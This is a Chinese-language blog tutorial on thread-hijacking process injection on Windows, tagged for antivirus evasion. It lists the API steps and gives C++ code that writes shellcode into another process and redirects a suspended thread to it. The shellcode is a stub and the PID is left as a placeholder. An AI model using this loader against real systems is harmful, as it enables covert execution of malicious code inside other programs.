---
layout: post
title: Thread Hijacking Inject
categories: Inject
description: Inject 之 Thread Hijacking
keywords: Windows，注入，免杀，Thread Hijacking
---

线程劫持注入技术

# 线程劫持注入

## 原理

利用线程劫持技术注入远程进程。

## 实现流程

1. `OpenProcess` 打开要注入的进程句柄 `targetProcessHandle` 
2.  `VirtualAllocEx` 在目标进程中分配可执行内存 `remoteBuffer`
3. `WriteProcessMemory` 将 `remoteBuffer` 中的 Shellcode 写入内存
4. 在目标进程中找到要劫持的线程ID。`CreateToolhelp32Snapshot`  创建快照并`Thread32Next` 枚举，获取要劫持的线程ID
5. `OpenThread` 打开要劫持的线程句柄`threadHijacked`
6. `SuspendThread` 挂起目标线程挂起目标线程
7. `GetThreadContext` 获取目标线程上下文
8. 将目标线程指令指针（`RIP`寄存器）指向 shellcode `remoteBuffer` 
9. `SetThreadContext` 设置被劫持线程的新上下文
10. `ResumeThread` 恢复被劫持线程



## 示例代码

```cpp
#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

int main()
{
	unsigned char shellcode[] =
		"\xfc\x48";

	HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context;
	
	DWORD targetPID = "这里填PID";
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);
	
	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	
	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}
	
	SuspendThread(threadHijacked);
	
	GetThreadContext(threadHijacked, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);
	
	ResumeThread(threadHijacked);
}
```

